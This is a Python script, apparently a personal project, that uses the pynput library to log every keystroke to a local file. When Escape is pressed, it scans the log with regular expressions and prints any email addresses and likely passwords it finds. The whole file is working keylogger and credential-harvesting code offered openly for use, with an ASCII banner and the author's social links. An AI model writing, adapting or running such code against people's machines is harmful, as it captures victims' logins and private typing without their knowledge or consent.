import re
from pynput.keyboard import Key, Listener

email_pattern = re.compile(r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}(?:\.[A-Z|a-z]{2,})?\b')
password_pattern = re.compile(r'\b[A-Za-z0-9@#$%^&+=]{8,}\b')


def fancy_print():
    print('''░█▀▀░█▀█░█▀▄░█░█░█▀█░█▀▄░░░█▀█░█▀█░█░█░█▀█░█▀▄░▀█▀
░█▀▀░█▀█░█▀▄░█▀█░█▀█░█░█░░░█▀█░█░█░█▄█░█▀█░█▀▄░░█░
░▀░░░▀░▀░▀░▀░▀░▀░▀░▀░▀▀░░░░▀░▀░▀░▀░▀░▀░▀░▀░▀░▀░▀▀▀
''')
    print("---------------------------------------------------------------")
    print("Key logger started...\nCapturing keystrokes...\nPress ESC to stop the keylogger and search for "
          "credentials...")
    print("---------------------------------------------------------------")
    print(
        "Connect with me:\nLinkedIn: https://www.linkedin.com/in/farhadanwari\nGitHub: "
        "https://github.com/farhadanwari\nTwitter: https://twitter.com/farhadAnwari8\n")

    print("---------------------------------------------------------------")


fancy_print()


def search_for_credentials():
    with open('keystrokes.txt', 'r') as f:
        data = f.read()
        emails = email_pattern.findall(data)
        passwords = password_pattern.findall(data)
        print('\nEmails found:')
        for email in emails:
            print(f"Email: {email}")
        output = []
        for email in emails:
            split_email = email.split(".")
            for part in split_email:
                output.append(part)

        print('\nPasswords found:')
        for password in passwords:
            if password in output:
                continue
            print(f"Password: {password}")


def on_press(key):
    try:
        with open('keystrokes.txt', 'a') as f:
            try:
                f.write(str(key.char))
            except AttributeError:
                match key:
                    case Key.esc:
                        print('Exiting program...')
                        return False
                    case Key.enter:
                        f.write('\n')
                    case Key.space:
                        f.write(' ')
                    # etc..
    except Exception as error:
        print("error:", error)
        return False


with Listener(on_press=on_press) as listener:
    listener.join()

search_for_credentials()
